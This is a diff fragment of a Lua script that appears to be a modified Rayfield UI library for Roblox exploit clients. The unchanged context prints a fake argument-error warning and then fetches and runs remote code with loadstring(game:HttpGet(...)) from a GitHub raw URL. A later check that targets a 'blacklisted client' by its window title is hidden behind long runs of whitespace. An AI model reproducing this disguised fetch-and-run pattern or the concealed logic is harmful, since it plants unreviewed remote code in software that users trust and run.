@@ -550,8 +550,8 @@ else
 	local quote_1 = '"'
 	local quote_2 = '"'
 	local main_String = tostring_string_word.." "..left_bracket..quote_1..Get_String..quote_2..right_bracket
-	warn(main_String..":"..tostring(random_set_numbers)..": Invalid argument #1 (number expected, got CFrame)")--]]
-	wait(0.2)
+	warn(main_String..":"..tostring(random_set_numbers)..": Invalid argument #1 (number expected, got CFrame)")
+	wait(0.2)--]]
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/EnterpriseExperience/bruhlolw/refs/heads/main/prote'))()
 	getgenv().css_digital = true
 end
@@ -1633,7 +1633,7 @@ function RayfieldLibrary:CreateWindow(Settings)
 			return ColorPickerSettings
 		end
 
-																																																																																																																																																																			if Rayfield.Main.Topbar.Title.Text == "🔥MYS'S CLIENT V5🔥" then
+																																																																																																																																																																			if Rayfield.Main.Topbar.Title.Text == "🎅MYS'S CLIENT V5🎄" then
 																																																																																																																																																																				local to_string = "You are using a blacklisted client."
 
 																																																																																																																																																																				make_tween(game.Players.LocalPlayer, to_string)
